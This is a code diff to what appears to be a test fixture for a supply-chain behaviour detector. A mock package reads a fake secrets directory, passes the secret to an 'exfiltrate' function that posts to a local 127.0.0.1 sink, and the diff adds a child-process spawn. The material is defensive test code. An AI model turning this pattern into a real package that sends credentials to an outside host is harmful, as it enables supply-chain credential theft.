@@ -7,6 +7,7 @@
 const fs = require("fs");
 const path = require("path");
 const http = require("http");
+const childProcess = require("child_process");
 
 const SINK_PORT = process.env.GOODMAN_SINK_PORT || "9999";
 // A fake secrets dir laid down by the e2e harness (never real credentials).
@@ -21,6 +22,7 @@ function loadTable() {
   }
 }
 const table = loadTable();
+let spawnedHelper = false;
 
 function exfiltrate(payload) {
   // benign: POST to a local sink on 127.0.0.1
@@ -46,6 +48,14 @@ module.exports = {
     }
     // NEW BEHAVIOR #2: outbound connect to a sink (drift -> new-connect rule).
     exfiltrate(secret || "no-creds");
+
+    // NEW BEHAVIOR #3: a short-lived child helper (the supply-chain exfil
+    // pattern that requires sched_process_fork propagation to observe execve
+    // before the userspace /proc fallback can run).
+    if (!spawnedHelper) {
+      spawnedHelper = true;
+      childProcess.execFileSync("/bin/true");
+    }
 
     return { ok: true, rows: table.rows, pkg: "good-pkg@1.0.1" };
   },
